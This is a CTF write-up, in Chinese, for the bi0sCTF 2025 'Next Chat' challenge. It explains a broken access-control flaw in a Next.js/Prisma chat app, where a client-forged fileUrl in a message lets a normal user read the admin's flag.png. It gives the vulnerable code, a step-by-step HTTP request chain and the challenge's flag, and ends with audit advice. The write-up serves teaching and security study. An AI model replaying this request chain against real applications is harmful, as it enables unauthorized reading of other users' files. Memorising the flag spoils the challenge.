# bi0sCTF 2025：Next Chat

## 题目简述

题目提供了一个基于 Next.js、NextAuth、Prisma 和 Socket.IO 的私聊应用。管理员初始化时，服务端会创建 `admin` 用户，并把工作目录中的 `flag.png` 复制到 `uploads/<adminId>/flag.png`。目标是以普通用户身份读取这张只属于管理员的图片。

仓库给出的简短提示是 `Tailwind Injection and Race`，但按当前源码检查，存在一条更直接、无需竞态和管理员访问页面的非预期利用链：消息接口允许客户端把任意字符串写入 `SentDirectMessage.fileUrl`；文件下载接口随后只检查数据库中是否存在一条 `fileUrl` 包含目标路径、且攻击者是发送者或会话成员的消息。它没有验证这条路径是否由上传接口生成，也没有把消息、文件所有者和会话参与者严格绑定。

决定性代码位于以下位置：

- `admin/src/src/lib/admin.js`：创建管理员，并把 `flag.png` 复制到管理员上传目录；
- `admin/src/src/app/api/conversations/[conversationId]/messages/route.js`：原样持久化请求体中的 `fileUrl`；
- `admin/src/src/app/api/get-file/[userId]/[filename]/route.js`：用 `contains` 和宽松的 `OR` 条件决定跨用户读取权限；
- `admin/src/src/app/api/files/access/route.js`：前端使用的预检查接口，存在相同的授权缺陷。

## 解题过程

### 1. 确认 flag 的落盘位置

`initAdmin()` 在首次启动时生成管理员，然后执行等价于下面的操作：

```javascript
const targetDir = path.join(process.cwd(), "uploads", admin.id);
const flagSrc = path.join(process.cwd(), "flag.png");
const flagDest = path.join(targetDir, "flag.png");
fs.copyFileSync(flagSrc, flagDest);
```

因此，只要获得管理员 ID，目标 URL 就可以确定为：

```text
/api/get-file/<adminId>/flag.png
```

仓库里还提交了一份 `admin/src/uploads/<id>/flag.png` 测试图片，但 `docker-compose.yml` 会把宿主机临时目录挂载到 `/app/uploads`，覆盖镜像中的同名目录。新实例真正复制的是 `admin/src/flag.png`，不能把仓库中的测试图片误认成部署时的目标。

### 2. 找到授权判断的逻辑漏洞

普通用户在自己参与的任意会话中，都可以调用消息接口。服务端只要求 `content` 和 `fileUrl` 至少提供一个，随后直接创建记录：

```javascript
const { content, fileUrl } = await req.json();

const message = await prisma.sentDirectMessage.create({
  data: {
    content: content || "",
    fileUrl,
    senderId,
    conversationId
  }
});
```

跨用户读取文件时，`get-file` 路由根据 URL 参数拼出 `dbPath`，再查找一条匹配消息：

```javascript
const dbPath = `/api/get-file/${userId}/${filename}`;

const isAllowedInDM = await prisma.sentDirectMessage.findFirst({
  where: {
    fileUrl: { contains: dbPath },
    OR: [
      { senderId: currentUser },
      {
        conversation: {
          OR: [
            { memberOneId: currentUser },
            { memberTwoId: currentUser }
          ]
        }
      }
    ]
  }
});
```

问题不只是 `contains`。攻击者自己发送伪造的 `fileUrl` 后，`senderId: currentUser` 就足以满足 `OR`；查询没有核对 URL 中的 `userId` 是否属于该消息的真实发送者，也没有要求文件记录来自上传接口。于是，攻击者可以先在自己的合法会话里“声明”管理员文件路径，再读取这个实际存在的路径。

### 3. 构造请求链

先注册并登录普通账号，取得 NextAuth 会话 Cookie。随后可搜索管理员：

```http
GET /api/users/search?q=admin HTTP/1.1
Cookie: <普通用户会话>
```

返回结果会包含管理员 ID。接着需要一个攻击者参与的会话。可以直接与管理员创建会话，也可以使用与其他普通用户的会话，因为最终放行可以仅依赖攻击者是伪造消息的发送者：

```http
POST /api/conversations HTTP/1.1
Content-Type: application/json
Cookie: <普通用户会话>

{"memberTwoId":"<任意其他用户ID>"}
```

在该会话中发送一条附件路径指向管理员 flag 的消息：

```http
POST /api/conversations/<conversationId>/messages HTTP/1.1
Content-Type: application/json
Cookie: <普通用户会话>

{
  "content": "File attachment",
  "fileUrl": "/api/get-file/<adminId>/flag.png"
}
```

这条记录的 `senderId` 是当前普通用户，且 `fileUrl` 与下载路由构造的 `dbPath` 完全相同，所以权限查询能够命中。直接请求文件即可：

```http
GET /api/get-file/<adminId>/flag.png HTTP/1.1
Cookie: <普通用户会话>
```

`/api/files/access?path=...` 只是前端展示附件前调用的预检查接口，不是读取文件的必要步骤；它使用近似相同的宽松条件，因此同样会返回 `allowed: true`。

管理员目标图片对解题有用的内容只有一行 flag 文本，装饰性画面不参与漏洞判断，因此直接转写而不保留截图。图片文字与根目录 `README.md` 可一致读出：

```text
bi0sctf{congratz_n0w_s0lve_other_cha11s_83a4}
```

本次核对完成了源码级证据闭环和原图文字对照，没有启动完整服务，因此没有把静态推导描述成远端动态复现。

## 方法总结

这题按当前源码可归类为 Web 访问控制缺陷。核心不是路径遍历，而是“客户端可伪造资源引用”与“授权查询信任该引用”两个问题组合：攻击者先向数据库写入管理员文件 URL，再利用过宽的 `OR` 条件让自己成为这条引用的合法发送者，最终越权读取真实文件。

审计类似应用时，应沿着“文件生成位置 → 客户端可控字段 → 数据库存储 → 下载鉴权 → 文件系统读取”完整追踪。授权时应依据不可伪造的文件记录 ID，并同时校验文件所有者、消息所属会话及当前成员关系；不能把用户可写的 URL 字符串本身当作访问凭据。题面中的 `Tailwind Injection and Race` 可能反映预期解法，但它们不是当前源码中完成读取所必需的条件，题解不应为了迎合提示而忽略更直接的实际漏洞。
